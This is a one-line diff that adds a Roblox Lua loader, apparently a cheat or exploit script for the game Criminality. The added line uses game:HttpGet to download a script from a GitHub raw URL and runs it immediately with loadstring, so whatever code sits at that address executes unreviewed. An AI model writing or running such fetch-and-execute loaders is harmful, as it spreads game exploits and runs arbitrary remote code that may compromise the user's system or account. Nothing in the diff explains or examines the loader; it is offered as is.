@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/2x-criminality-spam2-xmlmylqflq3sg4.lua"))()
